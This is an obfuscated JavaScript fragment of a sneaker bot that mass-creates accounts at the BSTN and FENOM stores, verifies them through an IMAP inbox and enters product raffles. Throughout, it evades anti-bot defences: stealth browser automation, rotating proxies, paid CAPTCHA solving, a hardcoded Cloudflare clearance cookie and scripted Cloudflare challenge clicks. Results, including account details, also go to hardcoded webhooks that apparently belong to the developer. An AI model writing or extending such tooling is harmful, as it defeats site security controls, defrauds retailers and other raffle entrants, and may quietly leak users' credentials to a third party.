                            }), console['log'](_0x38a61b() + '\x20[' + _0x57147e['name'] + ']\x20Task\x20' + (_0x48f860 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xd8ecf2['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0xd8ecf2['setRequestInterception'](!![]), _0xd8ecf2['on']('request', _0x3c0bab => {
                                _0x3c0bab['resourceType']() === 'image' ? _0x3c0bab['abort']() : _0x3c0bab['continue']();
                            }), await _0xd8ecf2['goto']('' + _0x4f47be), await _0xd8ecf2['waitForSelector']('button[class=\x22cf2Lf6\x22]'), await _0xd8ecf2['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x38a61b() + '\x20[' + _0x57147e['name'] + ']\x20Task\x20' + (_0x48f860 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0xbbd9dc(0x7d0), console['log'](_0x38a61b() + '\x20[' + _0x57147e['name'] + ']\x20Task\x20' + (_0x48f860 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0xbbd9dc(0x190), await _0xd8ecf2['waitForSelector']('#firstname'), await _0xd8ecf2['type']('#firstname', _0x5680b2[_0x48f860]['FirstName'], { 'delay': 0xf0 }), await _0xbbd9dc(0x190), await _0xd8ecf2['type']('#lastname', _0x5680b2[_0x48f860]['LastName'], { 'delay': 0xe6 }), await _0xbbd9dc(0x190), await _0xd8ecf2['type']('#email_address', _0x5680b2[_0x48f860]['Email'], { 'delay': 0x122 }), await _0xbbd9dc(0x190), await _0xd8ecf2['type']('#password', _0x5680b2[_0x48f860]['Password'], { 'delay': 0x82 }), await _0xbbd9dc(0x1f4), await _0xd8ecf2['type']('#password-confirmation', _0x5680b2[_0x48f860]['Password'], { 'delay': 0x7c }), console['log'](_0x38a61b() + '\x20[' + _0x57147e['name'] + ']\x20Task\x20' + (_0x48f860 + 0x1) + '\x20:\x20Sending\x20Request'), await _0xbbd9dc(0x2bc), await _0xd8ecf2['$eval']('#form-validate', _0x5af732 => _0x5af732['submit']()), await _0xbbd9dc(0x1388);
                            const _0x226bd3 = await _0xd8ecf2['$']('#email_address-error');
                            if (_0x226bd3)
                                throw new Error('Invalid\x20Email');
                            const _0xae50ec = await _0xd8ecf2['$']('#password-error');
                            if (_0xae50ec)
                                throw new Error('Invalid\x20Password');
                            await _0xd8ecf2['waitForSelector']('div.mesg-success'), _0x1c5a83 = 'no', console['log'](_0x19e6c5['green'](_0x38a61b() + '\x20[' + _0x57147e['name'] + ']\x20Task\x20' + (_0x48f860 + 0x1) + '\x20:\x20Account\x20' + _0x5680b2[_0x48f860]['Email'] + '\x20Generated')), _0x80a504['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x5680b2[_0x48f860]['Email'] + ',' + _0x5680b2[_0x48f860]['Password']);
                            try {
                                _0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '' && await _0x4236dd(_0x9a51aa['webhook'], _0x327732['succesDEVMSG']);
                            } catch {
                            }
                            await _0x4236dd(_0xe1dcb8, _0x327732['succesDEVMSG']), console['log'](_0x19e6c5['yellow'](_0x38a61b() + '\x20[' + _0x57147e['name'] + ']\x20Task\x20' + (_0x48f860 + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                        } catch (_0x2ca30f) {
                            console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x57147e['name'] + ']\x20Task\x20' + (_0x48f860 + 0x1) + '\x20:\x20' + _0x2ca30f)), _0x394b52 = '' + _0x2ca30f;
                            var _0x347057 = await _0x23dc1b(_0x5680b2[_0x48f860], _0x57147e, 'acc', !![], _0x394b52);
                            _0x327732['errorDEV'] = { 'embeds': [_0x347057] }, _0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '' && await _0x4236dd(_0x9a51aa['webhook'], _0x327732['errorDEV']), await _0x4236dd(_0x48c50b, _0x327732['errorDEV']), _0x1c5a83 = 'yes';
                        } finally {
                            _0x1a4c21['close']();
                            if (_0x1c5a83 == 'yes' && _0x5eaa25 != 0x5) {
                                console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x57147e['name'] + ']\x20Task\x20' + (_0x48f860 + 0x1) + '\x20:\x20Retrying')), _0x48f860 = _0x48f860 - 0x1, _0x5eaa25 = _0x5eaa25 + 0x1;
                                continue;
                            }
                            _0x1c5a83 == 'yes' && _0x5eaa25 >= 0x5 && (_0xc8d9fd(_0x5680b2[_0x48f860], _0x57147e), _0x1c5a83 = 'no', _0x5eaa25 = 0x0), console['log'](_0x38a61b() + '\x20[' + _0x57147e['name'] + ']\x20Waiting\x20for\x20' + _0x9a51aa['delay'] + '\x20ms'), await _0xbbd9dc(_0x9a51aa['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x185da4, _0x59b4fb, _0xeea829) {
                    var _0x59b4fb = [];
                    async function _0x262655() {
                        var _0x3de070 = new _0x9597be({
                            'user': _0x9a51aa['masterMail'],
                            'password': _0x9a51aa['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x2c61eb(_0x105cef) {
                            _0x3de070['openBox']('INBOX', ![], _0x105cef);
                        }
                        _0x3de070['once']('ready', function () {
                            _0x2c61eb(function (_0x3e1df4, _0x44f768) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x3e1df4)
                                    throw _0x3e1df4;
                                _0x3de070['seq']['search'](['UNSEEN'], function (_0x500781, _0x18debd) {
                                    if (!_0x18debd || !_0x18debd['length'])
                                        console['log'](_0x38a61b() + '\x20[' + _0x185da4['name'] + ']\x20No\x20mails\x20found'), _0x3de070['end']();
                                    else {
                                        var _0x19d538 = _0x3de070['seq']['fetch'](_0x18debd, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x19d538['on']('message', function (_0xef650b, _0x4af952) {
                                            var _0xdc68cc = '(#' + _0x4af952 + ')\x20';
                                            _0xef650b['on']('body', function (_0x543a30, _0x208512) {
                                                _0x45ab86(_0x543a30, (_0x5095c2, _0x22fdc0) => {
                                                    if (_0x22fdc0['subject'] == 'Please\x20confirm\x20your\x20BSTN\x20Store\x20account') {
                                                        var _0x3be982 = _0x22fdc0['text']['split']('[')[0x2], _0x50e32a = _0x3be982['split'](']')[0x0], _0x18511e = _0x22fdc0['html']['split']('\x0a');
                                                        _0x59b4fb['push'](_0x50e32a);
                                                    }
                                                });
                                            }), _0xef650b['once']('end', function () {
                                            });
                                        }), _0x19d538['once']('error', function (_0x19ba7d) {
                                            console['log']('Fetch\x20error:\x20' + _0x19ba7d);
                                        }), _0x19d538['once']('end', function () {
                                            _0x3de070['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x3de070['once']('error', function (_0x1c4842) {
                            console['log'](_0x19e6c5['red'](_0x1c4842['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x3de070['once']('end', async function () {
                        }), _0x3de070['connect']();
                    }
                    async function _0x4d2c7a(_0x6bd6b7, _0x4caffb, _0x32e000) {
                        _0x6d7b51['use'](_0x1a9750());
                        for (var _0x590425 = 0x0; _0x590425 < _0x4caffb['length']; _0x590425++) {
                            if (_0x26a740 != 'yes')
                                var _0x26a740 = '', _0x241c1c = 0x0;
                            var _0x4d8b29 = Math['round'](Math['random']() * (_0x32e000['length'] - 0x1)), _0x2d1ae2 = _0x32e000[_0x4d8b29]['split'](':');
                            const _0x59a524 = await _0x6d7b51['launch']({
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2d1ae2[0x0] + ':' + _0x2d1ae2[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                            try {
                                const _0x19a465 = await _0x59a524['newPage']();
                                await _0x19a465['authenticate']({
                                    'username': '' + _0x2d1ae2[0x2],
                                    'password': '' + _0x2d1ae2[0x3]
                                }), console['log'](_0x38a61b() + '\x20[' + _0x6bd6b7['name'] + ']\x20Task\x20' + (_0x590425 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x19a465['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x19a465['setRequestInterception'](!![]), _0x19a465['on']('request', _0x95dfc6 => {
                                    _0x95dfc6['resourceType']() === 'image' || _0x95dfc6['resourceType']() === 'font' || _0x95dfc6['resourceType']() === 'media' ? _0x95dfc6['abort']() : _0x95dfc6['continue']();
                                }), console['log'](_0x38a61b() + '\x20[' + _0x6bd6b7['name'] + ']\x20Task\x20' + (_0x590425 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x19a465['goto'](_0x4caffb[_0x590425]), console['log'](_0x38a61b() + '\x20[' + _0x6bd6b7['name'] + ']\x20Task\x20' + (_0x590425 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x19a465['waitForTimeout'](0xbb8);
                                try {
                                    await _0x19a465['waitForSelector']('.account-nav'), _0x26a740 = 'no', console['log'](_0x19e6c5['green'](_0x38a61b() + '\x20[' + _0x6bd6b7['name'] + ']\x20Task\x20' + (_0x590425 + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x2a7552 = await _0x23dc1b(null, _0x6bd6b7, 'ver', ![]);
                                    const _0x2b51b7 = { 'succesDEVMSG': { 'embeds': [_0x2a7552] } };
                                    await _0x4236dd(_0xb51342, _0x2b51b7['succesDEVMSG']);
                                } catch (_0x4a8960) {
                                    throw new Error(_0x4a8960);
                                }
                            } catch (_0x4e780b) {
                                console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x6bd6b7['name'] + ']\x20Task\x20' + (_0x590425 + 0x1) + '\x20:\x20' + _0x4e780b));
                                var _0x5d672c = _0x4e780b, _0x14dcf0 = await _0x23dc1b(null, _0x6bd6b7, 'ver', !![], _0x5d672c);
                                const _0x412f96 = { 'errorDEVMSG': { 'embeds': [_0x14dcf0] } };
                                _0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '' && await _0x4236dd(_0x9a51aa['webhook'], _0x412f96['errorDEVMSG']), await _0x4236dd(_0x48c50b, _0x412f96['errorDEVMSG']), _0x26a740 = 'yes';
                            } finally {
                                _0x59a524['close']();
                                if (_0x26a740 == 'yes' && _0x241c1c != 0x5) {
                                    console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x6bd6b7['name'] + ']\x20Task\x20' + (_0x590425 + 0x1) + '\x20:\x20Retrying')), _0x590425 = _0x590425 - 0x1, _0x241c1c = _0x241c1c + 0x1;
                                    continue;
                                }
                                _0x26a740 == 'yes' && _0x241c1c >= 0x5 && (_0x26a740 = 'no', _0x241c1c = 0x0), console['log'](_0x38a61b() + '\x20[' + _0x6bd6b7['name'] + ']\x20Waiting\x20for\x20' + _0x9a51aa['delay'] + '\x20ms'), await _0xbbd9dc(_0x9a51aa['delay']);
                            }
                        }
                    }
                    try {
                        _0x262655(), await _0xbbd9dc(0xfa0), console['log']('Found\x20' + _0x59b4fb['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x4d2c7a(_0x185da4, _0x59b4fb, _0xeea829);
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x5444b6, _0x2fa08c, _0x1414e) {
                    _0x6d7b51['use'](_0x1a9750()), _0x6d7b51['use'](_0xf48e5f({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x9a51aa['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xc508db = 0x0; _0xc508db < _0x2fa08c['length']; _0xc508db++) {
                        var _0x3fe058;
                        await _0x2f5330(_0x2fa08c, _0xc508db);
                        if (_0x5e5188 != 'yes')
                            var _0x5e5188 = '', _0x573baa = 0x0;
                        _0x1f02d2(_0x5444b6['name'] + '\x20Task\x20' + (_0xc508db + 0x1) + '\x20/\x20' + _0x2fa08c['length'] + '\x20||\x20File:\x20' + _0x52146d + '\x20Proxies:\x20' + _0x5291fa);
                        var _0x2629d6 = Math['round'](Math['random']() * (_0x1414e['length'] - 0x1)), _0x233ca6 = _0x1414e[_0x2629d6]['split'](':'), _0x2b4dc2;
                        try {
                            _0x2b4dc2 = await _0x6d7b51['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x233ca6[0x0] + ':' + _0x233ca6[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2b4dc2 = await _0x6d7b51['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x233ca6[0x0] + ':' + _0x233ca6[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x3662bf = await _0x2b4dc2['newPage'](), _0x4ff01c = await _0x3662bf['target']()['createCDPSession'](), { windowId: _0x534e4c } = await _0x4ff01c['send']('Browser.getWindowForTarget');
                            await _0x3662bf['setViewport']({
                                'width': 0x501,
                                'height': 0x2d0
                            });
                            var _0x53bab6 = [{
                                'name': 'cf_clearance',
                                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                'domain': '.bstn.com',
                                'path': '/',
                                'expires': 1707818183.331533,
                                'httpOnly': !![],
                                'secure': !![]
                            }];
                            await _0x3662bf['authenticate']({
                                'username': '' + _0x233ca6[0x2],
                                'password': '' + _0x233ca6[0x3]
                            }), console['log'](_0x38a61b() + '\x20[' + _0x5444b6['name'] + ']\x20Task\x20' + (_0xc508db + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3662bf['goto']('' + _0x2fa08c[_0xc508db]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x38a61b() + '\x20[' + _0x5444b6['name'] + ']\x20Task\x20' + (_0xc508db + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x3662bf['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L'), await _0x4ff01c['send']('Browser.setWindowBounds', {
                                'windowId': _0x534e4c,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0xbbd9dc(0x1388), await _0x3662bf['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x3662bf['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0xbbd9dc(0x1f4), console['log'](_0x38a61b() + '\x20[' + _0x5444b6['name'] + ']\x20Task\x20' + (_0xc508db + 0x1) + '\x20:\x20Logging\x20in'), await _0x3662bf['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x5f0f4e => _0x5f0f4e['click']()), await _0x3662bf['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x3662bf['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0xbbd9dc(0x7d0), await _0x3662bf['waitForSelector']('#email-login'), await _0x3662bf['type']('#email-login', '' + _0x2fa08c[_0xc508db]['Email']), await _0xbbd9dc(0xdac), await _0x3662bf['waitForSelector']('#password'), await _0x3662bf['type']('#password', '' + _0x2fa08c[_0xc508db]['Password'], { 'delay': 0xe6 }), await _0xbbd9dc(0x157c);
                            try {
                                await _0x3662bf['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x1698e2 => _0x1698e2['click']());
                            } catch {
                            }
                            try {
                                await _0x3662bf['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                            } catch (_0x34190c) {
                            }
                            await _0xbbd9dc(0x3e8);
                            const _0x256409 = await _0x3662bf['$']('.enteredDraw_container__2KmQ_');
                            if (_0x256409)
                                throw new Error('Duplicate\x20Entry');
                            console['log'](_0x38a61b() + '\x20[' + _0x5444b6['name'] + ']\x20Task\x20' + (_0xc508db + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x2fa08c[_0xc508db]['Size']);
                            if (_0x2fa08c[_0xc508db]['Size'] != 'RANDOM') {
                                var _0x26e2d5 = _0x2fa08c[_0xc508db]['Size']['replace']('.', ',');
                                const _0x56f496 = await _0x3662bf['$x']('//div[contains(text(),\x20' + _0x26e2d5 + ')]');
                                await _0x56f496[0x0]['click']();
                            } else {
                                const _0x3981b7 = await _0x3662bf['$$']('div.swatchTile_tile__IRH9Q');
                                var _0x315cfd = Math['round'](Math['random']() * (_0x3981b7['length'] - 0x1));
                                await _0x3981b7[_0x315cfd]['click']();
                            }
                            await _0xbbd9dc(0x1f4);
                            const _0x3b1f7a = await _0x3662bf['$']('.addressList_addressItem__LE2PB');
                            if (_0x3b1f7a && _0x2fa08c[_0xc508db]['Mode'] != 'NEW') {
                            } else
                                console['log'](_0x38a61b() + '\x20[' + _0x5444b6['name'] + ']\x20Task\x20' + (_0xc508db + 0x1) + '\x20:\x20Filling\x20Address'), await _0x3662bf['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0xbbd9dc(0x5dc), await _0x3662bf['waitForSelector']('#firstname'), await _0x3662bf['type']('#firstname', '' + _0x2fa08c[_0xc508db]['FirstName']), await _0xbbd9dc(0x1f4), await _0x3662bf['waitForSelector']('#firstname'), await _0x3662bf['type']('#lastname', '' + _0x2fa08c[_0xc508db]['LastName']), await _0xbbd9dc(0x1f4), await _0x3662bf['waitForSelector']('#firstname'), await _0x3662bf['type']('#street', '' + _0x2fa08c[_0xc508db]['Address1']), await _0xbbd9dc(0x1f4), await _0x3662bf['waitForSelector']('#firstname'), await _0x3662bf['type']('#houseNumber', _0x2fa08c[_0xc508db]['HouseNumber'] + '\x20' + _0x2fa08c[_0xc508db]['Address2']), await _0xbbd9dc(0x1f4), await _0x3662bf['waitForSelector']('#firstname'), await _0x3662bf['select']('#country_code', '' + _0x2fa08c[_0xc508db]['Country']), await _0xbbd9dc(0x1f4), await _0x3662bf['type']('#postcode', '' + _0x2fa08c[_0xc508db]['Zip']), await _0xbbd9dc(0x1f4), await _0x3662bf['type']('#city', '' + _0x2fa08c[_0xc508db]['City']), await _0xbbd9dc(0x1f4), await _0x3662bf['type']('#telephone', '' + _0x2fa08c[_0xc508db]['Phone']), await _0xbbd9dc(0x1f4), await _0x3662bf['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                            await _0xbbd9dc(0x9c4);
                            try {
                                await _0x3662bf['type']('#instagram_name', '' + _0x2fa08c[_0xc508db]['Follower']), await _0x3662bf['click']('.note_groupBtn__WLDwH\x20>\x20button');
                            } catch {
                            }
                            console['log'](_0x38a61b() + '\x20[' + _0x5444b6['name'] + ']\x20Task\x20' + (_0xc508db + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0xbbd9dc(0x5dc);
                            try {
                                await _0x3662bf['click']('.checkBox_boxHolder__wLGVe');
                            } catch {
                            }
                            await _0xbbd9dc(0x5dc), await _0x3662bf['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x33de61 => _0x33de61['click']()), await _0xbbd9dc(0x1388);
                            try {
                                await _0x3662bf['waitForSelector']('.success_msg__2HjJY');
                            } catch {
                                await _0x3662bf['reload']({ 'waitUntil': 'networkidle2' });
                                if (_0x2fa08c[_0xc508db]['Size'] != 'RANDOM') {
                                    var _0x26e2d5 = _0x2fa08c[_0xc508db]['Size']['replace']('.', ',');
                                    const _0x282454 = await _0x3662bf['$x']('//div[contains(text(),\x20' + _0x26e2d5 + ')]');
                                    await _0x282454[0x0]['click']();
                                } else {
                                    const _0x991ae9 = await _0x3662bf['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x315cfd = Math['round'](Math['random']() * (_0x991ae9['length'] - 0x1));
                                    await _0x991ae9[_0x315cfd]['click']();
                                }
                                await _0xbbd9dc(0x5dc);
                                try {
                                    await _0x3662bf['hover']('#instagram_name'), await _0x3662bf['type']('#instagram_name', '' + _0x2fa08c[_0xc508db]['Follower']), await _0x3662bf['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x38a61b() + '\x20[' + _0x5444b6['name'] + ']\x20Task\x20' + (_0xc508db + 0x1) + '\x20:\x20Retrying'), await _0x3662bf['hover']('.checkBox_boxHolder__wLGVe'), await _0xbbd9dc(0x5dc), await _0x3662bf['click']('.checkBox_boxHolder__wLGVe'), await _0xbbd9dc(0x157c), await _0x3662bf['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x50648f => _0x50648f['click']()), await _0xbbd9dc(0x1388), await _0x3662bf['waitForSelector']('.success_msg__2HjJY');
                            }
                            _0x5e5188 = 'no', _0x5d1d0f(_0x2fa08c[_0xc508db], _0x5444b6), console['log'](_0x19e6c5['green'](_0x38a61b() + '\x20[' + _0x5444b6['name'] + ']\x20Task\x20' + (_0xc508db + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            var _0x4064a6 = await _0x23dc1b(_0x2fa08c[_0xc508db], _0x5444b6, 'dev', ![]), _0x3d6b91 = await _0x23dc1b(_0x2fa08c[_0xc508db], _0x5444b6, 'pub', ![]);
                            const _0x42ddef = {
                                'succesDEVMSG': { 'embeds': [_0x4064a6] },
                                'succesPUBMSG': { 'embeds': [_0x3d6b91] }
                            };
                            try {
                                _0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '' && await _0x4236dd(_0x9a51aa['webhook'], _0x42ddef['succesDEVMSG']), await _0xbbd9dc(0xc8), await _0x4236dd(_0x5df4ad, _0x42ddef['succesDEVMSG']), await _0xbbd9dc(0xc8), await _0x4236dd(_0x4d6262, _0x42ddef['succesPUBMSG']);
                            } catch (_0x283fbb) {
                                console['log'](_0x19e6c5['yellow'](_0x38a61b() + '\x20[' + _0x5444b6['name'] + ']\x20Task\x20' + (_0xc508db + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x283fbb));
                            }
                        } catch (_0x42536f) {
                            console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x5444b6['name'] + ']\x20Task\x20' + (_0xc508db + 0x1) + '\x20:\x20' + _0x42536f)), _0x5e5188 = 'yes', _0x3fe058 = '' + _0x42536f;
                            var _0x448a72 = await _0x23dc1b(_0x2fa08c[_0xc508db], _0x5444b6, 'dev', !![], _0x3fe058), _0x4064a6 = await _0x23dc1b(_0x2fa08c[_0xc508db], _0x5444b6, 'dev', ![]), _0x3d6b91 = await _0x23dc1b(_0x2fa08c[_0xc508db], _0x5444b6, 'pub', ![]);
                            const _0x12766d = {
                                'succesDEVMSG': { 'embeds': [_0x4064a6] },
                                'succesPUBMSG': { 'embeds': [_0x3d6b91] }
                            };
                            _0x12766d['errorDEV'] = { 'embeds': [_0x448a72] }, _0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '' && await _0x4236dd(_0x9a51aa['webhook'], _0x12766d['errorDEV']), await _0x4236dd(_0x48c50b, _0x12766d['errorDEV']);
                        } finally {
                            _0x2b4dc2['close']();
                            if (_0x5e5188 == 'yes' && _0x573baa != 0x5) {
                                console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x5444b6['name'] + ']\x20Task\x20' + (_0xc508db + 0x1) + '\x20:\x20Retrying')), _0xc508db = _0xc508db - 0x1, _0x573baa = _0x573baa + 0x1;
                                continue;
                            }
                            _0x5e5188 == 'yes' && _0x573baa >= 0x5 && (_0xc8d9fd(_0x2fa08c[_0xc508db], _0x5444b6), _0x5e5188 = 'no', _0x573baa = 0x0), console['log'](_0x38a61b() + '\x20[' + _0x5444b6['name'] + ']\x20Waiting\x20for\x20' + _0x9a51aa['delay'] + '\x20ms'), await _0xbbd9dc(_0x9a51aa['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x148663, _0x28e904, _0xda5580) {
                    _0x6d7b51['use'](_0x1a9750()), _0x6d7b51['use'](_0xf48e5f({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x9a51aa['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x33086f = 0x0; _0x33086f < _0x28e904['length']; _0x33086f++) {
                        if (_0x4ce39e != 'yes')
                            var _0x4ce39e = '', _0x367163 = 0x0;
                        var _0x5ee2e4;
                        await _0x2f5330(_0x28e904, _0x33086f), _0x1f02d2(_0x148663['name'] + '\x20Task\x20' + (_0x33086f + 0x1) + '\x20/\x20' + _0x28e904['length'] + '\x20||\x20File:\x20' + _0x52146d + '\x20Proxies:\x20' + _0x5291fa);
                        var _0x4953ac = await _0x23dc1b(_0x28e904[_0x33086f], _0x148663, 'acc', ![]);
                        const _0xc7959f = { 'succesDEVMSG': { 'embeds': [_0x4953ac] } }, _0x1e514c = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x340f2b = Math['round'](Math['random']() * (_0xda5580['length'] - 0x1)), _0x5ef864 = _0xda5580[_0x340f2b]['split'](':'), _0x1ccf6b;
                        try {
                            _0x1ccf6b = await _0x6d7b51['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x5ef864[0x0] + ':' + _0x5ef864[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1ccf6b = await _0x6d7b51['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x5ef864[0x0] + ':' + _0x5ef864[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x131677 = await _0x1ccf6b['newPage']();
                            await _0x131677['setViewport']({
                                'width': 0x500 + _0x38a9f3(0x1, 0x32),
                                'height': 0x2d9 + _0x38a9f3(0x1, 0x32)
                            });
                            const _0x14b9fc = await _0x131677['target']()['createCDPSession'](), { windowId: _0x2e5136 } = await _0x14b9fc['send']('Browser.getWindowForTarget');
                            await _0x131677['authenticate']({
                                'username': '' + _0x5ef864[0x2],
                                'password': '' + _0x5ef864[0x3]
                            }), console['log'](_0x38a61b() + '\x20[' + _0x148663['name'] + ']\x20Task\x20' + (_0x33086f + 0x1) + '\x20:\x20Getting\x20Session'), await _0x131677['goto']('' + _0x1e514c, { 'waitUntil': 'networkidle2' }), await _0xbbd9dc(0x1388), console['log'](_0x38a61b() + '\x20[' + _0x148663['name'] + ']\x20Task\x20' + (_0x33086f + 0x1) + '\x20:\x20Solving\x20Cloudflare');
                            try {
                                const _0x507b2a = await _0x131677['$eval']('input[value=\x22Verify\x20you\x20are\x20human\x22]');
                                _0x507b2a && await _0x507b2a['click']();
                            } catch {
                            }
                            await _0x14b9fc['send']('Browser.setWindowBounds', {
                                'windowId': _0x2e5136,
                                'bounds': { 'windowState': 'minimized' }
                            });
                            try {
                                await _0x131677['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0xbbd9dc(0xfa0);
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            console['log'](_0x38a61b() + '\x20[' + _0x148663['name'] + ']\x20Task\x20' + (_0x33086f + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x131677['type']('input[name=\x22firstname\x22]', '' + _0x28e904[_0x33086f]['FirstName']), await _0xbbd9dc(0x1f4), await _0x131677['type']('input[name=\x22lastname\x22]', '' + _0x28e904[_0x33086f]['LastName']), await _0xbbd9dc(0x1f4), await _0x131677['type']('input[name=\x22email\x22]', '' + _0x28e904[_0x33086f]['Email']), await _0xbbd9dc(0x1f4), await _0x131677['type']('input[name=\x22password\x22]', '' + _0x28e904[_0x33086f]['Password']), await _0xbbd9dc(0x258), await _0x131677['$eval']('input[name=\x22psgdpr\x22]', _0xb70c21 => _0xb70c21['click']()), await _0xbbd9dc(0x1f4), console['log'](_0x38a61b() + '\x20[' + _0x148663['name'] + ']\x20Task\x20' + (_0x33086f + 0x1) + '\x20:\x20Sending\x20Request'), await _0x131677['$eval']('#customer-form', _0x35842a => _0x35842a['submit']());
                            try {
